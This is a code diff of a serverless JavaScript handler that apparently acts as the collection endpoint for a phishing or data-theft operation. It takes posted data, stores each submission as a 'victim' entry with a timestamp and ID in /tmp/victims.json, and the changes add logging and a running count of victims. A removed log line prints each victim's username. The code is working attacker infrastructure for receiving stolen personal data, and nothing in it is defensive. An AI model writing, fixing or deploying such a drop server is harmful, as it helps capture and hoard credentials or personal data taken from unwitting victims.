@@ -25,31 +25,34 @@ exports.handler = async function(event, context) {
             return { statusCode: 401, headers, body: JSON.stringify({ error: 'Unauthorized' }) };
         }
 
-        // Create new victim entry with timestamp
+        // Create new victim entry
         const newVictim = {
             id: Date.now() + '-' + Math.random().toString(36).substr(2, 9),
             timestamp: new Date().toISOString(),
             ...data
         };
 
-        // Read existing victims
+        // Define file path
+        const dataPath = '/tmp/victims.json';
+        console.log('📁 Attempting to write to:', dataPath);
+
+        // Read existing data
         let victims = [];
-        const dataPath = path.join('/tmp', 'victims.json');
-        
         try {
             const fileData = readFileSync(dataPath, 'utf8');
             victims = JSON.parse(fileData);
+            console.log('📖 Read existing victims:', victims.length);
         } catch (e) {
-            // File doesn't exist yet, start with empty array
+            console.log('📝 No existing file, creating new one');
         }
 
-        // Add new victim to the beginning
+        // Add new victim
         victims.unshift(newVictim);
+        console.log('➕ Added new victim, total:', victims.length);
 
-        // Save back to file
+        // Write back
         writeFileSync(dataPath, JSON.stringify(victims, null, 2));
-
-        console.log('✅ Data saved for:', data?.username);
+        console.log('💾 Successfully wrote to file');
 
         return {
             statusCode: 200,
@@ -58,16 +61,20 @@ exports.handler = async function(event, context) {
                 success: true,
                 message: 'Data received',
                 timestamp: new Date().toISOString(),
-                victim_id: data?.victim_id
+                victim_id: data?.victim_id,
+                total_victims: victims.length
             })
         };
 
     } catch (error) {
-        console.error('Error:', error);
+        console.error('❌ Critical error:', error);
         return {
             statusCode: 500,
             headers,
-            body: JSON.stringify({ error: 'Internal error' })
+            body: JSON.stringify({ 
+                error: 'Internal error',
+                details: error.message 
+            })
         };
     }
 };
